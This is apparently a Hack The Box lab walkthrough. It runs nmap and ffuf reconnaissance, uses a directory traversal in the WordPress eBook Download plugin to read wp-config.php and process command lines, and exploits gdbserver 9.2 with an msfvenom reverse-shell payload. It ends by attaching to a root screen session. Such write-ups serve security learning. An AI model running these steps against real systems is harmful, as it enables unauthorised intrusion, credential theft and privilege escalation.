```
http://10.10.11.125/wp-content/plugins/
WordPress Plugin eBook Download 1.1 - Directory Traversal
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
GNU gdbserver 9.2 - Remote Command Execution (RCE)
ps aux
screen -x root/root
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.11.125
```
![image](https://github.com/regarmulia/HTB/assets/33616880/be022ff2-0ea7-4b07-850c-62180b3ecaa5)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.125/wp-content/FUZZ -e .aspx,.php,.txt,.html
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5f77925a-e53f-4365-8239-b28c5e9704f2)


```
http://10.10.11.125/wp-content/plugins/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fa8d6c3e-19ee-4647-868b-f71fc8fdc5fc)


```
https://www.exploit-db.com/exploits/39575
```
![image](https://github.com/regarmulia/HTB/assets/33616880/40ce0af1-0709-4d35-8248-112d04a32829)


```
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d3bfc7b6-6986-42bc-b970-94e3d598aff9)


```
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6d3ff846-8d87-41ee-bb76-3d492edc6d34)
![image](https://github.com/regarmulia/HTB/assets/33616880/5664cfa5-f4d7-4f34-bfbd-433946f7cf65)
![image](https://github.com/regarmulia/HTB/assets/33616880/16123463-9033-489e-9fb1-024324f33a02)


```
https://www.exploit-db.com/exploits/50539
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4f9f0677-885f-4244-bae0-f203d49a199a)


```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 PrependFork=true -o rev.bin
python3 50539.py 10.10.11.125:1337 rev.bin
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4299ba5f-e471-48c4-8137-0d1da24569cc)


```
ps aux
```
![image](https://user-images.githubusercontent.com/33616880/230254776-1416e191-549f-4f02-a683-cce2a129a5db.png)
![image](https://user-images.githubusercontent.com/33616880/230255081-2d9d559b-e3b9-4c4a-93d6-530f40436951.png)


```
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
screen -x root/root
```
![image](https://user-images.githubusercontent.com/33616880/230254965-359d1dd1-6eab-4e74-824f-fdb933ff8615.png)
![image](https://user-images.githubusercontent.com/33616880/230254971-feb96981-888e-4074-9941-9f76ec8ee266.png)
